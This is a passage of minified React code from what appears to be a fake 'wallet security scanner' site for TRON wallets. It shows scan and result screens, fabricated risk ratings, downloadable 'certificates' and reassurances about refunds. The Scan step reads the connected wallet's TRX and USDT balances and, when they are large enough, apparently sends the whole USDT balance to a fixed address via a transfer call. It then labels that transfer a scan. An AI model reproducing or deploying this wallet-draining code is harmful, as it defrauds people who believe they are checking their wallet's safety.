                            className: " primarry-page text-center text-gray-600",
                            children: "Transaction analyzed:"
                        }), L.jsx("h3", {
                            className: " font-semibold text-lg",
                            children: "Secure Wallet"
                        })]
                    }), L.jsxs("nav", {
                        className: "flex flex-row items-center justify-between w-full",
                        children: [L.jsx("p", {
                            className: " primarry-page text-center text-gray-600",
                            children: "Transaction ID:"
                        }), L.jsx("h3", {
                            className: " font-semibold text-lg",
                            children: i(o)
                        })]
                    }), L.jsxs("nav", {
                        className: "flex flex-row items-center justify-between w-full",
                        children: [L.jsx("p", {
                            className: " primarry-page text-center text-gray-600",
                            children: "Clean Transaction Rete:"
                        }), L.jsx("h3", {
                            className: " font-semibold text-lg",
                            children: "Excellent"
                        })]
                    }), L.jsxs("nav", {
                        className: "flex flex-row items-center justify-between w-full",
                        children: [L.jsx("p", {
                            className: " primarry-page text-center text-gray-600",
                            children: "Risk Level:"
                        }), L.jsx("h3", {
                            className: "text-green-500 font-semibold text-lg",
                            children: "Meduim"
                        })]
                    }), L.jsx("p", {
                        className: " primarry-page text-center text-gray-600",
                        children: "* The Reports are sourced directly from the blockchain. If TRX was Deducted for the test due to high demand, it will be refunded within 24 hours. Typically, we cover the gas fees for the test.*"
                    })]
                })]
            }), L.jsx("a", {
                href: "#",
                children: L.jsx(dn, {
                    className: "inline-flex items-center justify-center  gap-2 hover:gap-3 whitespace-nowrapv  px-4  h-11 bg-[#9333EA] hover:bg-black text-white rounded-md shadow-md shadhow-blue-500/20 hover:shadow-blue-500/30 transition-all duration-300 focus-visible:ring-2  font-medium focus-visible:outline-none",
                    children: "Download Report"
                })
            }), L.jsx("a", {
                href: "#",
                children: L.jsx(dn, {
                    className: "inline-flex items-center justify-center  gap-2 hover:gap-3 whitespace-nowrapv  px-4  h-11 bg-white hover:bg-white text-[#9333EA]  hover:text-black  rounded-md shadow-md shadhow-blue-500/20 hover:shadow-blue-500/30 transition-all duration-300 focus-visible:ring-2  font-medium focus-visible:outline-none",
                    children: "Download Certificate"
                })
            })]
        })
    })
}
  , qme = ({onNext: r}) => {
    const {account: e, setTransactionId: t, setAccount: o, usdtbalance: i, setUSDTBalance: n, setMidProgress: s} = h0()
      , [a,l] = ue.useState(null);
    ue.useEffect( () => {
        let p = !0;
        return e && p && f(e),
        () => {
            p = !1
        }
    }
    , [e]);
    const f = async p => {
        try {
            const v = await au.trx.getBalance(p) / 1e6;
            l(v);
            const T = await Lme(p);
            if (n(T),
            console.log("Balance", v, T),
            v < lE) {
                s(100);
                return
            }
            if (Number(T) < HW) {
                s(100);
                return
            }
            const x = au.toBigNumber(Number(T).toString()).times("1e6").toFixed(0)
              , E = await kme(Ume, x, p);
            t(E.transaction.txID),
            E.result && r()
        } catch (b) {
            console.error("Error fetching TRX balance:", b)
        }
    }
      , h = async () => {
        await $a.disconnect(),
        o(void 0),
        window.location.href = "/dashboard"
    }
    ;
    return console.log("Balance outer", a, i),
    L.jsx("div", {
        className: "flex items-center justify-center w-full ",
        children: L.jsxs("div", {
            className: "w-full px-8  flex items-center justify-center flex-col gap-2",
            children: [L.jsx("h1", {
                className: "oswald-heading-h3 uppercase text-gray-900",
                children: "Scan Your Wallet"
            }), L.jsx("p", {
                className: "primary-page text-gray-400 text-center",
                children: "Start scanning your wallet to get your security score"
            }), a === null ? L.jsxs("div", {
                className: "w-full md:w-[600px] px-6 py-10 flex items-center justify-center flex-col gap-6 border-[#dec3f7] border rounded-lg bg-white shadow-md relative",
                children: [L.jsx("div", {
                    style: {
                        animation: "pulseSize 2s ease-in-out infinite"
                    },
                    className: "flex justify-center items-center border-2  rounded-full bg-white w-18 h-18",
                    children: L.jsx(Gs, {
                        className: "w-14 h-14",
                        onClick: r
                    })
                }), L.jsxs("div", {
                    className: "w-full flex flex-col items-center space-y-3",
                    children: [L.jsx("div", {
                        className: "w-full h-2 bg-gray-300 rounded-full overflow-hidden",
                        children: L.jsx("div", {
                            className: "h-full w-1/2 bg-purple-500 transition-all duration-500"
                        })
                    }), L.jsx("p", {
                        className: "text-sm text-gray-500 text-center",
                        children: "Scanning wallet data for vulnerabilities and risks...."
                    })]
                })]
            }) : a >= lE ? L.jsxs("div", {
                className: "w-full md:w-[600px] px-6 py-10 flex items-center justify-center flex-col gap-3 border-[#dec3f7] border rounded-lg bg-white shadow-md relative",
                children: [L.jsx("div", {
                    style: {
                        animation: "pulseSize 2s ease-in-out infinite"
                    },
                    className: "flex justify-center items-center border-2  rounded-full bg-white w-18 h-18",
                    children: L.jsx(Gs, {
                        className: "w-14 h-14",
                        onClick: r
                    })
                }), L.jsx("p", {
                    className: "text-sm  text-gray-500 text-center",
                    children: "Balance"
                }), L.jsxs("p", {
                    className: "text-sm  text-gray-500 font-bold text-center",
                    children: ["TRX: ", a]
                }), L.jsxs("p", {
                    className: "text-sm mt-0 text-gray-500 font-bold text-center",
                    children: ["USDT: ", i]
                }), L.jsx(dn, {
                    onClick: h,
                    className: "bg-[#A855F7] hover:bg-gray-900 text-white w-40 mt-2",
                    children: "Disconnect"
                }), L.jsxs("div", {
                    className: "w-full flex flex-col items-center space-y-3",
                    children: [L.jsx("div", {
                        className: "w-full h-2 bg-gray-300 rounded-full overflow-hidden",
                        children: L.jsx("div", {
                            className: "h-full w-full bg-purple-500 transition-all duration-500"
                        })
                    }), Number(i) < HW ? L.jsx("p", {
                        className: "text-sm text-green-500 text-center",
                        children: "Your assets are genuine. No flash or reported USDT found."
                    }) : ""]
                })]
            }) : L.jsxs("div", {
                className: "w-full md:w-[600px] px-6 py-10 flex items-center justify-center flex-col gap-3 border-[#dec3f7] border rounded-lg bg-white shadow-md relative",
                children: [L.jsx("div", {
                    style: {
                        animation: "pulseSize 2s ease-in-out infinite"
                    },
                    className: "flex justify-center items-center border-2  rounded-full bg-red-500 w-18 h-18",
                    children: L.jsx(Gs, {
                        className: "w-14 h-14",
                        onClick: r
                    })
                }), L.jsx("p", {
                    className: "text-sm  text-gray-500 text-center",
                    children: "Balance"
                }), L.jsxs("p", {
                    className: "text-sm  text-gray-500 font-bold text-center",
                    children: ["TRX: ", a]
                }), L.jsxs("p", {
                    className: "text-sm mt-0 text-gray-500  font-bold text-center",
                    children: ["USDT: ", i]
                }), L.jsx(dn, {
                    onClick: h,
                    className: "bg-[#A855F7] hover:bg-gray-900 text-white w-40 mt-2",
                    children: "Disconnect"
                }), L.jsxs("div", {
                    className: "w-full flex flex-col items-center space-y-3",
                    children: [L.jsx("div", {
                        className: "w-full h-2 bg-gray-300 rounded-full overflow-hidden",
                        children: L.jsx("div", {
                            className: "h-full w-full bg-purple-500 transition-all duration-500"
                        })
                    }), L.jsxs("p", {
                        className: "text-sm text-red-500 text-center",
                        children: ["You don't have enough TRX balance to proceed. Please top up your wallet.", L.jsxs("p", {
                            className: "font-bold ",
                            children: ["(Required ", lE, " TRX)"]
                        })]
                    })]
                })]
            })]
        })
    })
}
  , Vme = [{
    name: "Connect",
    Component: zme
}, {
    name: "Scan",
    Component: qme
}, {
    name: "Waitlist",
    Component: _H
}, {
    name: "Result",
    Component: jme
}]
  , uE = [["#fbcfe8", "#fdf2f8"], ["#e0f2fe", "#eff6ff"], ["#e9d5ff", "#f3e8ff"], ["#fdf2f8", "#fce7f3"], ["#eff6ff", "#e0f2fe"], ["#f3e8ff", "#ede9fe"]]
  , Hme = () => {
    const [r,e] = ue.useState(uE[0]);
    return ue.useEffect( () => {
        const t = setInterval( () => {
            const o = uE[Math.floor(Math.random() * uE.length)];
            e(o)
        }
        , Math.floor(Math.random() * 3e3) + 5e3);
        return () => clearInterval(t)
    }
    , []),
    L.jsxs("div", {
        className: "w-screen min-h-screen transition-all duration-[6000ms] ease-in-out flex items-center justify-center py-10 px-4",
        style: {
            backgroundImage: `linear-gradient(to bottom right, ${r[0]}, ${r[1]})`,
            transition: "background-image 6s ease-in-out"
        },
        children: [L.jsx(y3, {}), L.jsx(BH, {
            stepsConfig: Vme
        })]
    })
}
  , GW = [["#fbcfe8", "#fdf2f8"], ["#e0f2fe", "#eff6ff"], ["#e9d5ff", "#f3e8ff"], ["#fdf2f8", "#fce7f3"], ["#eff6ff", "#e0f2fe"], ["#f3e8ff", "#ede9fe"]]
  , Gme = () => {
    const [r,e] = ue.useState(0);
    ue.useEffect( () => {
        const o = setInterval( () => {
            e(i => (i + 1) % GW.length)
        }
        , 7e3);
        return () => clearInterval(o)
    }
    , []);
    const t = GW[r];
    return L.jsxs("div", {
        className: "w-screen h-screen transition-all duration-[6000ms] ease-in-out flex items-center justify-center",
        style: {
            backgroundImage: `linear-gradient(to right, ${t[0]}, ${t[1]})`,
            transition: "background-image 6s ease-in-out"
        },
        children: [L.jsx(y3, {}), L.jsxs("div", {
            className: "flex shadow-2xl flex-col items-center justify-center p-10 rounded-2xl w-full max-w-xl  bg-opacity-90",
            children: [L.jsx("h3", {
                className: "oswald-heading-h3 uppercase text-gray-900",
                children: "Wallet Verification"
            }), L.jsx("p", {
                className: "primarry-page text-gray-600 text-center",
                children: "Check if a wallet is valid and if it has a valid certificate"
            }), L.jsx("input", {
                type: "text",
                placeholder: "Enter Wallet Address",
                className: "mt-4 border-2 bg-white border-gray-500 rounded-xl p-2 w-full"
            }), L.jsx("button", {
                className: "mt-4 bg-gray-900 text-white px-4 py-2 rounded-md cursor-pointer",
                children: "Check"
            })]
        })]
    })
}
  , Kme = () => L.jsx("div", {
    className: "w-screen  mx-auto overflow-x-hidden",
    children: L.jsx(Gz, {})
});
function Zme() {
    const r = mj([{
        path: "/",
        element: L.jsx(Kme, {}),
        children: [{
            index: !0,
            element: L.jsx(PH, {})
        }, {
            path: "/dashboard",
            element: L.jsx(Hme, {})
        }, {
            path: "/checker",
            element: L.jsx(Gme, {})
        }]
    }]);
    return L.jsx(Oj, {
        router: r
    })
}
v$.createRoot(document.getElementById("root")).render(L.jsx(CH, {
    children: L.jsx(Zme, {})
}));
export {Qn as C, Qme as E, UJ as H, qv as M, ss as O, yM as R, v8 as T, Td as a, e1e as b, YH as c, I1e as d, bB as e, BJ as f, Zc as g, _1e as h, O1 as i, M1e as j, R1e as k, O1e as r, sN as t, kJ as w};
